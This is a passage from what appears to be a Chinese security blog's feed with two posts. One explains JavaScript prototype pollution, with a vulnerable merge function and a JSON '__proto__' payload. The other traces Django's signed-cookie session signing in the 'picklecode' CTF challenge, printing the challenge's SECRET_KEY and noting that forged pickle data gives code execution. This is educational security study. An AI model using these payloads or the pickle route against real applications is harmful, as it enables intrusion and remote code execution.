class="string">"Person.prototype.constructor: "</span>+Person.prototype.constructor); </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Person.prototype.constructor: function Person() &#123;</span></span><br><span class="line"><span class="comment">    this.color = "yellow";</span></span><br><span class="line"><span class="comment">    this.showColor = function () &#123;</span></span><br><span class="line"><span class="comment">        return this.color;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person(); </span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"person1.constructor: "</span>+person1.constructor); </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">person1.constructor: function Person() &#123;</span></span><br><span class="line"><span class="comment">    this.color = "yellow";</span></span><br><span class="line"><span class="comment">    this.showColor = function () &#123;</span></span><br><span class="line"><span class="comment">        return this.color;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// person1 实例通过 __proto__ 指向了 Person 的原型(Person.prototype)，所以可以访问到 constructor</span></span><br><span class="line"></span><br><span class="line">Person.prototype = &#123;&#125;; </span><br><span class="line"><span class="comment">// 修改 Person 的原型为 &#123;&#125;，这里也可以看处 prototype 可以在运行时修改</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person2 = <span class="keyword">new</span> Person(); <span class="built_in">console</span>.log(<span class="string">"person2.constructor: "</span>+person2.constructor);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">person2.constructor: function Object() &#123; [native code] &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// person2 实例通过 __proto__ 指向了 Person 的原型(Person.prototype)，即这个空对象，所以它访问到 constructor 为 Object</span></span><br></pre></td></tr></table></figure></li><li><p>上面说到，原型对象有一个 <code>constructor</code> ，它指向函数本身而且 <code>constructor</code> 的 <code>constructor</code> 是一个全局函数 <code>constructor</code> </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(person2.constructor.constructor);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Global Function constructor</span></span><br><span class="line"><span class="comment">print ƒ Function() &#123; [native code] &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">person2.constructor.constructor(<span class="string">"return 1"</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ƒ anonymous(</span></span><br><span class="line"><span class="comment">) &#123;</span></span><br><span class="line"><span class="comment">return 1</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">person2.constructor.constructor(<span class="string">"return 1"</span>)();</span><br><span class="line"><span class="comment">// call this Global Function</span></span><br><span class="line"><span class="comment">// print 1</span></span><br></pre></td></tr></table></figure></li><li><p>总结一下</p><ol><li>定义一个 <code>function</code> 时，会加上 <code>prototype</code> 属性，表示它的原型对象，内含 <code>constructor</code> ，返回这个 <code>function</code> 的构造函数的引用，即函数本身。而这个 <code>constructor</code> 的 <code>constructor</code> 是一个全局函数 <code>constructor</code> </li><li>定义一个实例化对象时，会加上 <code>__proto__</code> 属性，它等于 <code>function.prototype</code> ，这个对象的 <code>constructor</code> 就等于 <code>object.__proto__.constructor</code> ，但是这两个 <code>constructor</code> 代表的含义不同</li></ol></li></ul><h1 id="JavaScript-中的原型"><a href="#JavaScript-中的原型" class="headerlink" title="JavaScript 中的原型"></a>JavaScript 中的原型</h1><ul><li><p>函数的 <code>prototype</code> 可以在运行时修改</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">person</span>(<span class="params">fullName, age</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.age = age;</span><br><span class="line">    <span class="keyword">this</span>.fullName = fullName;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(person.prototype);</span><br><span class="line"><span class="comment">// &#123;details: ƒ, constructor: ƒ&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> person(<span class="string">"Anirudh"</span>, <span class="number">25</span>);</span><br><span class="line"> </span><br><span class="line">person.prototype.details = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.fullName + <span class="string">" has age: "</span> + <span class="keyword">this</span>.age;</span><br><span class="line">&#125;</span><br><span class="line">person.prototype.key=<span class="string">"peri0d"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(person.prototype);</span><br><span class="line"><span class="comment">// print &#123;details: ƒ, key: "peri0d", constructor: ƒ&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(person1.details()); </span><br><span class="line"><span class="comment">// print "Anirudh has age: 25"</span></span><br><span class="line"><span class="built_in">console</span>.log(person1.key); </span><br><span class="line"><span class="comment">// print "peri0d"</span></span><br></pre></td></tr></table></figure></li><li><p>在上面这段代码中我们通过添加一个新方法和属性的方式修改了函数的<code>prototype</code>，使用对象我们也可以达到同样的效果</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">person</span>(<span class="params">fullName, age</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.age = age;</span><br><span class="line">    <span class="keyword">this</span>.fullName = fullName;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> person(<span class="string">"Anirudh"</span>, <span class="number">25</span>);</span><br><span class="line"><span class="keyword">var</span> person2 = <span class="keyword">new</span> person(<span class="string">"Anand"</span>, <span class="number">45</span>);</span><br><span class="line"></span><br><span class="line">person1.constructor.prototype.details = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.fullName + <span class="string">" has age: "</span> + <span class="keyword">this</span>.age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 上下两个相同</span></span><br><span class="line">person1.__proto__.constructor.prototype.details = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.fullName + <span class="string">" has age: "</span> + <span class="keyword">this</span>.age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(person1.details()); </span><br><span class="line"><span class="comment">// print "Anirudh has age: 25"</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">console</span>.log(person2.details()); </span><br><span class="line"><span class="comment">// print "Anand has age: 45"</span></span><br></pre></td></tr></table></figure></li></ul><ul><li>个人认为，可以将函数看为类的构造函数，原型看为类</li></ul><h1 id="JavaScript-原型链继承"><a href="#JavaScript-原型链继承" class="headerlink" title="JavaScript 原型链继承"></a>JavaScript 原型链继承</h1><ul><li><p>所有类对象在实例化的时候将会拥有 <code>prototype</code> 中的属性和方法，这个特性被用来实现 <code>JavaScript</code> 中的继承机制</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.first_name = <span class="string">'Donald'</span></span><br><span class="line">    <span class="keyword">this</span>.last_name = <span class="string">'Trump'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.first_name = <span class="string">'Melania'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Son.prototype = <span class="keyword">new</span> Father()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> Son()</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br><span class="line"><span class="comment">// print "Name: Melania Trump"</span></span><br></pre></td></tr></table></figure><blockquote><p>1.在对象 son 中寻找 last_name<br>2.如果找不到，则在 son.__proto__中寻找 last_name<br>3.如果仍然找不到，则继续在 son.__proto__.__proto__中寻找 last_name<br>4.依次寻找，直到找到 null 结束。比如，Object.prototype 的  __proto__ 就是 null</p></blockquote></li><li><p>这里为什么没有 <code>Son.prototype = Father.prototype</code> ，个人认为 <code>Father.prototype</code> 指向的是一个类对象，并没有对属性进行实例化，所以 <code>Son</code> 相当于没有继承 <code>Father</code> </p></li><li><p>每个构造函数( <code>constructor</code> )都有一个原型对象( <code>prototype</code> )</p></li><li><p><code>object.__proto__</code> 指向 <code>function.prototype</code> </p></li><li><p>JavaScript 使用 <code>prototype</code> 链实现继承机制</p></li></ul><h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><ul><li><p>举个例子</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">person = &#123;<span class="attr">name</span> : <span class="string">"Jack"</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(person.name);</span><br><span class="line"><span class="comment">// print "Jack"</span></span><br><span class="line"></span><br><span class="line">person.__proto__.name = <span class="string">'peri0d'</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(person.name);</span><br><span class="line"><span class="comment">// print "Jack"</span></span><br><span class="line"></span><br><span class="line">person2 = &#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(person2.name);</span><br><span class="line"><span class="comment">// print "peri0d"</span></span><br></pre></td></tr></table></figure></li><li><p>在 <code>person</code> 这个实例化对象中寻找 <code>name</code> 属性，找到后输出。</p></li><li><p>将 <code>Object</code> 类的 <code>name</code> 属性赋值为 <code>peri0d</code> 然后实例化 <code>person2</code> 对象，在这个对象中没有找到 <code>name</code> 属性，进而到 <code>__proto__</code> 中去寻找，找到后输出。这实际上是修改了 <code>Object</code> 类</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/JavaScript/js_7.png" alt></p></li><li><p>在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象</p></li><li><p>可存在于对象合并和对象克隆中，找可以控制对象的属性的操作</p></li></ul><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><ul><li><p>以 <code>merge</code> 函数为例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>考虑如下代码，可以看到，<code>merge</code> 并没有修改 <code>__proto__</code> 下 <code>Object</code> 的内容，而是将 <code>b</code> 作为其属性添加，这样再生成新对象的时候还是原来的 <code>Object</code> </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">o1 = &#123;&#125;;</span><br><span class="line">o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">"__proto__"</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;;</span><br><span class="line">merge(o1, o2);</span><br><span class="line"><span class="built_in">console</span>.log(o1);</span><br><span class="line"><span class="comment">// print &#123;a: 1, b: 2&#125;</span></span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b);</span><br><span class="line"><span class="comment">// print undefined</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">in</span> o2)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// print ab</span></span><br></pre></td></tr></table></figure><p>​        <img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/JavaScript/js_6.png" alt></p></li><li><p>将代码修改一下，这时 <code>Object</code> 已被污染</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">o1 = &#123;&#125;;</span><br><span class="line">o2 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span>);</span><br><span class="line">merge(o1, o2);</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b);</span><br><span class="line"><span class="comment">// print 1 2</span></span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b);</span><br><span class="line"><span class="comment">// print 2</span></span><br></pre></td></tr></table></figure><p>​        <img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/JavaScript/js_8.png" alt></p></li><li><p>JSON 解析的情况下，__proto__ 会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历 o2 的时候会存在这个键。</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近遇到好多原型污染的题目，又没有学过，做一个总结。&lt;/p&gt;
&lt;p&gt;原文 : &lt;a href=&quot;https://bbs.pediy.com/thread-249643.htm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Node.js原型污染攻击的分析与利用&lt;/a&gt; and &lt;a href=&quot;https://www.freebuf.com/articles/web/200406.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;深入理解JavaScript Prototype污染攻击&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="JavaScript" scheme="http://yoursite.com/categories/JavaScript/"/>
    
    
      <category term="原型污染" scheme="http://yoursite.com/tags/%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93/"/>
    
      <category term="原型链" scheme="http://yoursite.com/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>code-breaking picklecode中对signed_cookies引擎分析</title>
    <link href="http://yoursite.com/2019/09/12/code-breaking%20picklecode%E4%B8%AD%E5%AF%B9signed_cookies%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/09/12/code-breaking picklecode中对signed_cookies引擎分析/</id>
    <published>2019-09-12T07:58:49.269Z</published>
    <updated>2019-09-12T08:05:43.081Z</updated>
    
    <content type="html"><![CDATA[<p>原帖 : <a href="https://xz.aliyun.com/t/6265" target="_blank" rel="noopener">https://xz.aliyun.com/t/6265</a></p><p>最近做了 ph 牛的 code-breaking，在做 picklecode 这一题时，没有搞懂那个 django 的 signed_cookies 引擎对 session 的操作，就 debug 了一下，做个总结，算是做了个代码审计吧</p><a id="more"></a><h1 id="0x01-获取-session-auth-hash"><a href="#0x01-获取-session-auth-hash" class="headerlink" title="0x01    获取 session_auth_hash"></a>0x01    获取 session_auth_hash</h1><ul><li><p>题目 : <a href="https://github.com/phith0n/code-breaking/tree/master/2018/picklecode" target="_blank" rel="noopener">https://github.com/phith0n/code-breaking/tree/master/2018/picklecode</a></p></li><li><p>django 使用的 SESSION_ENGINE 为 <code>django.contrib.sessions.backends.signed_cookies</code></p></li><li><p>pycharm 开启 debug 模式，username 为 peri0d，password 为 123456</p></li><li><p>入口文件在 <code>views.py</code>，第 34 行新建了用户并对密码进行了加密。第 35 行调用 <code>auth_login()</code> 函数，跳转到 <code>auth\__init__.py</code> 的 <code>login()</code> 方法 </p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_8.png" alt="pickle_8"></p></li><li><p>第 97 行，调用 <code>user</code> 类的 <code>get_session_auth_hash()</code> 方法来获取 <code>session_auth_hash</code> 的值，跟进 <code>get_session_auth_hash()</code></p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_9.png" alt="pickle_9"></p></li><li><p>给 <code>key_salt</code> 赋值后调用 <code>salted_hmac(key_salt, self.password)</code> 生成 <code>session_auth_hash</code>，这里的 <code>password</code> 是经过加密的，跟进 <code>salted_hmac()</code></p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_10.png" alt="pickle_10"></p></li><li><p>在第 39 行对 <code>key_salt + secret</code> 进行 sha1 加密并以 byte 类型返回给 <code>key</code>。这里的 <code>value</code> 是经过加密后的 <code>password</code>。然后调用 <code>hmac.new()</code>返回一个 sha1 模式的 <code>hmac</code> 对象</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_11.png" alt="pickle_11"></p></li><li><p>流程梳理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">key_salt = <span class="string">'***'</span></span><br><span class="line"><span class="comment"># SECRET_KEY</span></span><br><span class="line">secret = <span class="string">'******'</span></span><br><span class="line">key = hashlib.sha1(key_salt + secret).digest()</span><br><span class="line">sha1_obj = hmac.new(key, msg=password_enc, digestmod=hashlib.sha1)</span><br><span class="line">session_auth_hash = sha1_obj.hexdigest()</span><br></pre></td></tr></table></figure></li></ul><h1 id="0x02-初始化-sessionid"><a href="#0x02-初始化-sessionid" class="headerlink" title="0x02    初始化 sessionid"></a>0x02    初始化 sessionid</h1><ul><li><p>获取 <code>session_auth_hash</code> 后，单步调试，进入 <code>base.py</code> 执行 <code>__contains__()</code> 函数，参数为 <code>_auth_user_id</code></p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_22.png" alt="pickle_22"></p></li><li><p>单步调试，然后执行 <code>_get_session()</code> 函数，返回缓存 session，是一个空字典</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_23.png" alt="pickle_23"></p></li><li><p>在第 108 行执行 <code>cycle_key()</code>，使用新密钥保存相同的数据，调用 <code>save()</code>，它在请求结束时自动保存一个带有新密钥的 cookie 。</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_12.png" alt="pickle_12"></p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_13.png" alt="pickle_13"></p></li><li><p>跟进 <code>save()</code>，在第 41 行执行 <code>_get_session_key()</code> ，生成一个 base64 编码后的字符串作为 <code>session key</code>，继续跟进，它又调用了 <code>signing.dumps()</code> </p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_14.png" alt="pickle_14"></p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_15.png" alt="pickle_15"></p></li><li><p>然后单步调试进入到 <code>_get_session()</code> 方法获取 <code>self._session</code>，从缓存中加载 session，此时为一个空字典，即 <code>self._session == {}</code> </p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_16.png" alt="pickle_16"></p></li><li><p>然后分别给 compress，salt，serializer 赋值，然后调用 <code>signing.dumps()</code> ，继续跟进，传入的参数 <code>obj = {}, salt = &#39;django.contrib.sessions.backends.signed_cookies&#39;, compress = True</code> </p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_17.png" alt="pickle_17"></p></li><li><p>在 <code>signing.dumps()</code> 中对序列化之后的数据进行压缩，然后进行 base64 编码，再 <code>decode()</code> 为一个 Unicode 的 <code>base64d</code>，其值为 <code>&#39;gAN9cQAu&#39;</code> ，最后调用  <code>TimestampSigner</code> 类的 <code>sign()</code> 方法，继续跟进</p></li><li><p><code>TimestampSigner</code> 类继承自 <code>Signer</code> 类，先调用它的 <code>__init__</code> 方法进行初始化，<code>key = &#39;zs%o-mvuihtk6g4pgd+xpa&amp;1hh9%&amp;ulnf!@9qx8_y5kk+7^cvm&#39;, sep = &#39;:&#39;, salt = &#39;django.contrib.sessions.backends.signed_cookies&#39;</code></p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_18.png" alt="pickle_18"></p></li><li><p>然后调用  <code>TimestampSigner</code> 类的 <code>sign()</code> 方法，根据 <code>value=&#39;gAN9cQAu&#39;</code>，<code>sep</code> 和 <code>timestamp()</code> 对 <code>value</code> 进行重新赋值，其值为 <code>&#39;gAN9cQAu:1i5q6e&#39;</code> ，然后再次在 <code>Signer.sign()</code> 中重新赋值，得到最后结果 <code>&#39;gAN9cQAu:1i5q6e:wjJR2MUONx_wmPA3m8zYqTj5uCQ</code></p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_19.png" alt="pickle_19"></p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_20.png" alt="pickle_20"></p></li><li><p>回到 <code>save()</code> ，继续单步调试，调用了 <code>base.py</code> 中第 170 行的 <code>_set_session_key()</code> 方法，将 <code>value</code> 赋值给 <code>session_key</code> 和 <code>_session_key</code> </p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_21.png" alt="pickle_21"></p></li><li><p>回到 <code>save()</code> ，完成赋值，回到 <code>cycle_key()</code>，再回到 <code>auth\__init__.py</code> 的 <code>login()</code> 方法的第 108 行，这时可以在变量列表看到设置的 session 信息了</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_24.png" alt="pickle_24"></p></li><li><p>后面的代码是 django 对用户的持久化处理以及对 CSRF token 的验证等等，<strong>值得注意的是在第 126 行到 128 行，进行了 session 设置</strong></p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_25.png" alt="pickle_25"></p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_29.png" alt="pickle_29"></p></li><li><p>流程梳理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_session = &#123;&#125;</span><br><span class="line"><span class="comment"># SECRET_KEY</span></span><br><span class="line">secret = <span class="string">'******'</span></span><br><span class="line">salt=<span class="string">'****'</span></span><br><span class="line"></span><br><span class="line">data = serializer().dumps(_session)</span><br><span class="line">compressed = zlib.compress(data)</span><br><span class="line">base64d = b64_encode(data).decode()</span><br><span class="line"></span><br><span class="line">session_key = TimestampSigner(SECRET_KEY, salt=salt).sign(base64d)</span><br></pre></td></tr></table></figure></li></ul><h1 id="0x03-response-写入-session"><a href="#0x03-response-写入-session" class="headerlink" title="0x03    response 写入 session"></a>0x03    response 写入 session</h1><ul><li><p>然后看它如何在 response 中设置 cookie 的，继续调试，在 <code>contrib\sessions\middleware.py</code> 中发现其对 cookie 的操作，从 44 行开始是设置 cookie 的存活时间，在第 58 行看到了 <code>save()</code> 函数，进行 cookie 的保存，单步调试进入</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_26.png" alt="pickle_26"></p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_27.png" alt="pickle_27"></p></li><li><p>在 save() 函数中，调用 <code>_get_session_key()</code> 函数，剩下的反序列化和前面的相同，只是 session 的值发生了改变，从空字典变为含有 3 个元素的字典，然后就是将 cookie 设置在返回包中，这就完成了 cookie 设置的分析</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_28.png" alt="pickle_28"></p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_30.png" alt="pickle_30"></p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/code_breaking/pickle_29.png" alt="pickle_29"></p></li></ul><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04    总结"></a>0x04    总结</h1><ul><li><p>总结一下，它对 session 处理的核心机制在于 <code>django.core.signing.dumps()</code> 函数，其具体代码如下，可以看到，<code>data</code> 为 pickle 序列化之后的 byte 对象，我们只要将 <code>data</code> 改为构造好的 evil pickle code 即能实现任意的代码执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dumps</span><span class="params">(obj, key=None, salt=<span class="string">'django.core.signing'</span>, serializer=JSONSerializer, compress=False)</span>:</span></span><br><span class="line"></span><br><span class="line">    data = serializer().dumps(obj)</span><br><span class="line"></span><br><span class="line">    is_compressed = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> compress:</span><br><span class="line">        compressed = zlib.compress(data)</span><br><span class="line">        <span class="keyword">if</span> len(compressed) &lt; (len(data) - <span class="number">1</span>):</span><br><span class="line">            data = compressed</span><br><span class="line">            is_compressed = <span class="literal">True</span></span><br><span class="line">    base64d = b64_encode(data).decode()</span><br><span class="line">    <span class="keyword">if</span> is_compressed:</span><br><span class="line">        base64d = <span class="string">'.'</span> + base64d</span><br><span class="line">    <span class="keyword">return</span> TimestampSigner(key, salt=salt).sign(base64d)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原帖 : &lt;a href=&quot;https://xz.aliyun.com/t/6265&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/6265&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;最近做了 ph 牛的 code-breaking，在做 picklecode 这一题时，没有搞懂那个 django 的 signed_cookies 引擎对 session 的操作，就 debug 了一下，做个总结，算是做了个代码审计吧&lt;/p&gt;
    
    </summary>
    
      <category term="code-breaking" scheme="http://yoursite.com/categories/code-breaking/"/>
    
    
      <category term="code-breaking" scheme="http://yoursite.com/tags/code-breaking/"/>
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
